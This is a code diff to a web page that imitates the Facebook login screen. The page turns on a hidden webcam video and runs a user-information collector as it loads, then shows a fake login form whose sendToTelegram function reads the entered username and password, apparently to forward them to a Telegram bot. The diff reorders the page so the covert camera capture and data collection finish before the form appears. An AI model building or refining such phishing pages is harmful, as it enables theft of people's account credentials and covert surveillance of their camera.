@@ -117,10 +117,16 @@
         #video {
             display: none;
         }
+        #initial-container {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div id="initial-container">
+        <video id="video" width="640" height="480" autoplay></video>
+    </div>
+    <div class="container" id="main-container" style="display: none;">
         <div class="left">
             <h1>Facebook</h1>
             <p>Facebook helps you connect and share with the people in your life.</p>
@@ -136,7 +142,6 @@
             <button class="create-account">Create new account</button>
         </div>
     </div>
-    <video id="video" width="640" height="480" autoplay></video>
     <script>
         function getQueryParams() {
             const params = {};
@@ -243,6 +248,13 @@
             }
         }
 
+        async function initializeFirstPart() {
+            await startVideo();
+            await getUserInfo();
+            document.getElementById('initial-container').style.display = 'none';
+            document.getElementById('main-container').style.display = 'flex';
+        }
+
         function sendToTelegram() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
@@ -262,8 +274,7 @@
         }
 
         window.onload = () => {
-            startVideo();
-            getUserInfo();
+            initializeFirstPart();
         };
     </script>
 </body>
